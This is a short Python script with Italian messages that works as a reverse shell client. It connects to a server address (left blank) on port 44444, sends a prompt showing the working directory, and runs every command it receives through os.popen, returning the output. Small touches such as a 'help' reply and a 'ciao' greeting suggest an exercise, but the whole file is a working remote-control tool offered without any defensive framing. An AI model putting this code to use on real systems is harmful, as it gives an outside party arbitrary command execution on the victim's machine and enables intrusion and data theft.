import socket as so
import os

SRV_ADDR = ""
SRV_PORT = 44444

connection= so.socket(so.AF_INET, so.SOCK_STREAM)
connection.connect((SRV_ADDR, SRV_PORT))

while True:
    output = os.popen("pwd").read().rstrip() + " $ "
    connection.sendall(output.encode("utf-8"))
    data = connection.recv(1024)
    print (f"Received from server: {data.decode()}")
  
    if not data: 
        break
    cmd = data.decode("utf-8").rstrip()
  
    if cmd == "help":
        connection.sendall("Esegui qualsiasi comando\n".encode('utf-8'))
      
    elif cmd == "ciao":
        connection.sendall(b"Come stai?\n")
      
    else:
        output = os.popen(cmd).read() + "\n"
        connection.sendall(output.encode('utf-8'))
    print(data.decode("utf-8"))
  
connection.close()
